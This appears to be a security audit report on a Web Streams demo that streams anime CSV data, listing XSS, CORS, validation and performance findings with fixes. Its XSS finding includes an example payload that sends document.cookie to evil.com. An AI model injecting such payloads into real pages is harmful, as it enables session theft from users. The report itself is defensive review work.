# Security Audit Report

> **Auditor:** @carla-qa (QA Engineer — Adversarial Review)
> **Date:** 2026-08-27
> **Scope:** `app/index.js`, `server/index.js`, `app/index.html`, `package.json` (both)
> **Classification:** 🟡 Educational Demo — **NOT production-ready**

---

## Executive Summary

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 **Critical** | 2 | Must fix before any real deployment |
| 🟠 **High** | 3 | Fix for robustness |
| 🟡 **Medium** | 2 | Improve for production |
| 🟢 **Low** | 2 | Nice to have |

**Overall Risk Rating: HIGH** (for production use)

The project is an excellent educational demonstration of Web Streams but contains patterns that would be dangerous in production. Data from the CSV is rendered without sanitization (XSS), CORS is wide open, and there is no input validation.

---

## 🔴 Critical Findings

### SEC-001: XSS via `innerHTML` with Unsanitized Data

| Field | Value |
|-------|-------|
| **Location** | `app/index.js:71-72` |
| **CWE** | CWE-79 (Improper Neutralization of Input During Web Page Generation) |
| **CVSS Estimate** | 7.2 (High) |

**Vulnerable Code:**

```javascript
const card = `
  <article>
    <div class="text">
      <h3>[${++counter}] ${title}</h3>
      <p>${description.slice(0, 100)}</p>
      <a href="${url}">Here's why</a>
    </div>
  </article>
`;
sleep(1000).then(() => (element.innerHTML += card));
```

**Attack Vector:**

If `animeflv.csv` contained:
```csv
"<img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>",desc,url
```

The payload would execute in every visitor's browser.

**Exploitation scenarios:**
1. Cookie/session theft
2. Keylogging
3. Defacement
4. Cryptocurrency mining injection
5. Phishing overlays

**Remediation:**

```javascript
// ✅ Safe alternative using DOM APIs
write({ title, description, url_anime }) {
  const article = document.createElement('article');
  const textDiv = document.createElement('div');
  textDiv.className = 'text';
  
  const h3 = document.createElement('h3');
  h3.textContent = `[${++counter}] ${title}`;  // textContent escapes HTML
  
  const p = document.createElement('p');
  p.textContent = description.slice(0, 100);
  
  const a = document.createElement('a');
  // Validate URL before assignment
  try {
    const safeUrl = new URL(url_anime, window.location.origin);
    if (['http:', 'https:'].includes(safeUrl.protocol)) {
      a.href = safeUrl.href;
    }
  } catch { a.href = '#'; }
  a.textContent = "Here's why";
  
  textDiv.append(h3, p, a);
  article.appendChild(textDiv);
  element.appendChild(article);
}
```

**Alternative with DOMPurify:**

```javascript
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(card);
```

---

### SEC-002: Wildcard CORS Configuration

| Field | Value |
|-------|-------|
| **Location** | `server/index.js:8-11` |
| **CWE** | CWE-942 (Permissive Cross-domain Policy) |

**Vulnerable Code:**

```javascript
const headers = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "*",
};
```

**Impact:**

Any website on the internet can make requests to this server and read responses. If this streamed sensitive data instead of anime, it would be readable by any malicious site.

**Remediation:**

```javascript
const ALLOWED_ORIGINS = ['http://localhost:3001', 'http://127.0.0.1:3001'];

createServer(async (request, response) => {
  const origin = request.headers.origin;
  
  if (ALLOWED_ORIGINS.includes(origin)) {
    response.setHeader('Access-Control-Allow-Origin', origin);
  }
  response.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  response.setHeader('Vary', 'Origin');
  // ...
});
```

---

## 🟠 High Findings

### SEC-003: No Input Validation on CSV Data

| Field | Value |
|-------|-------|
| **Location** | `server/index.js:38-48` |
| **CWE** | CWE-20 (Improper Input Validation) |

**Issue:** The mapper assumes all CSV fields exist and are well-formed strings. There is no length limit, no type check, no URL validation.

**Risk:**
- `undefined` fields stringified as `"undefined"`
- Multi-MB description fields sent uncapped
- `javascript:` URLs passed through to client

**Remediation:**

```javascript
import { z } from 'zod';

const AnimeRecord = z.object({
  title: z.string().max(500),
  description: z.string().max(10_000),
  url_anime: z.string().url().refine(
    url => url.startsWith('https://'),
    'Only HTTPS URLs allowed'
  )
});

new TransformStream({
  async transform(jsonLine, controller) {
    try {
      const raw = JSON.parse(Buffer.from(jsonLine));
      const validated = AnimeRecord.parse(raw);
      controller.enqueue(JSON.stringify(validated) + '\n');
    } catch (err) {
      console.warn('Skipped invalid record:', err.message);
      // Continue stream; do not abort
    }
  }
});
```

---

### PERF-001: `innerHTML +=` Causes O(n²) DOM Reflow

| Field | Value |
|-------|-------|
| **Location** | `app/index.js:72` |

**Issue:**

```javascript
element.innerHTML += card;
```

Each `+=` operation:
1. Serializes entire existing DOM to HTML string
2. Concatenates new card
3. Re-parses entire HTML
4. Re-creates ALL DOM nodes
5. Destroys event listeners on existing children

For 8,000 anime records: 8,000 × reflow of up to 8,000 nodes = **32 million node operations**.

**Remediation:**

```javascript
// Option A: insertAdjacentHTML (still need sanitization!)
element.insertAdjacentHTML('beforeend', DOMPurify.sanitize(card));

// Option B: appendChild (best — DOM API)
element.appendChild(buildCardElement(data));

// Option C: Batch with requestAnimationFrame
let pendingCards = [];
let rafScheduled = false;

write(data) {
  pendingCards.push(data);
  if (!rafScheduled) {
    rafScheduled = true;
    requestAnimationFrame(() => {
      const fragment = document.createDocumentFragment();
      pendingCards.forEach(d => fragment.appendChild(buildCardElement(d)));
      element.appendChild(fragment);
      pendingCards = [];
      rafScheduled = false;
    });
  }
}
```

---

### PERF-002: Artificial Delay Defeats Streaming Purpose

| Field | Value |
|-------|-------|
| **Location** | `app/index.js:60, 72` |

**Issue:**

```javascript
sleep(1000).then(() => (element.innerHTML += card));
```

With ~8,000 records: minimum **2 hours 13 minutes** to display all data.
The comment says it's intentional for demo purposes, but this should be:
1. Documented prominently
2. Configurable
3. Removable without code surgery

**Remediation:**

```javascript
const RENDER_DELAY_MS = Number(new URLSearchParams(location.search).get('delay')) || 0;

// In write():
if (RENDER_DELAY_MS > 0) {
  await sleep(RENDER_DELAY_MS);  // await maintains backpressure
}
element.appendChild(buildCardElement(data));
```

---

## 🟡 Medium Findings

### QUAL-001: NDJSON Parser Breaks on Split Chunks

| Field | Value |
|-------|-------|
| **Location** | `app/index.js:17-33` |
| **Status** | ⚠️ Acknowledged in comments, NOT fixed |

**Issue:**

```javascript
transform(chunk, controller) {
  for (const item of chunk.split("\n")) {
    controller.enqueue(JSON.parse(item));  // Crashes on partial JSON
  }
}
```

The code even contains a comment explaining the problem but doesn't fix it. Network chunks **will** split JSON objects in production.

**Full analysis:** See [`patterns.md`](./patterns.md#24-pattern-ndjson-parser-client) for production implementation.

---

### ERR-001: No Structured Logging / Observability

| Field | Value |
|-------|-------|
| **Location** | Both files |

**Issue:** Only `console.log`/`console.error`. No log levels, correlation IDs, structured output, or metrics.

**Remediation:**

```javascript
// Minimal structured logger
const log = (level, msg, meta = {}) => 
  console.log(JSON.stringify({ ts: Date.now(), level, msg, ...meta }));

log('info', 'stream_started', { requestId, fileSize });
log('warn', 'record_skipped', { requestId, line, reason });
log('error', 'stream_failed', { requestId, error: err.message });
```

---

## 🟢 Low Findings

### QUAL-002: Missing package.json Metadata

| Field | Value |
|-------|-------|
| **Location** | Both `package.json` files |

Empty `description` fields, no `engines` field, no `repository`, no `keywords`. Add for discoverability and toolchain compatibility.

---

### SEC-004: Dependency Audit

| Package | Version | Risk | Notes |
|---------|---------|------|-------|
| `byte-size` | ^8.1.1 | 🟢 Low | Pure formatting; server-side only |
| `csvtojson` | ^2.0.10 | 🟡 Medium | Mature but check for updates; last release 2020 |
| `browser-sync` | ^3.0.2 | 🟡 Medium | Dev-only, but pulls many transitive deps |

**Recommendation:**

```bash
npm audit
npm audit fix
npx npm-check-updates -u
```

Add `engines` to package.json:

```json
{
  "engines": {
    "node": ">=18.0.0"
  }
}
```

---

## Remediation Priority Matrix

```
         HIGH IMPACT
              │
    SEC-002   │   SEC-001
   (CORS fix) │  (XSS fix)
              │
 LOW EFFORT ──┼────────────── HIGH EFFORT
              │
   SEC-004    │   QUAL-001
 (npm audit)  │ (line buffer)
              │
         LOW IMPACT
```

**Sprint Plan:**

| Order | Fix | Effort | Impact |
|-------|-----|--------|--------|
| 1 | SEC-001 XSS (DOM APIs) | 2h | Critical |
| 2 | SEC-002 CORS config | 30min | Critical |
| 3 | QUAL-001 Line buffer | 1h | High |
| 4 | PERF-001 DOM batching | 2h | High |
| 5 | SEC-003 Zod validation | 2h | High |
| 6 | ERR-001 Structured logging | 1h | Medium |

---

## Security Checklist for Production

- [ ] Sanitize all data before DOM insertion (DOMPurify or DOM APIs)
- [ ] Restrict CORS to explicit origin list
- [ ] Validate CSV schema with Zod/Ajv
- [ ] Add rate limiting (e.g., `express-rate-limit` or `undici` interceptor)
- [ ] Add authentication (JWT/OAuth) if data is non-public
- [ ] Set security headers: `X-Content-Type-Options`, `X-Frame-Options`, `CSP`
- [ ] Add request size limits
- [ ] Implement connection timeouts
- [ ] Add `helmet` middleware (if using Express/Fastify)
- [ ] Run `npm audit` in CI/CD
- [ ] Add Snyk/Dependabot scanning
- [ ] Penetration test before launch

---

*Audit by: @carla-qa | Avanade Method | Phase 4: Review*
*Next review: after Critical/High remediations complete*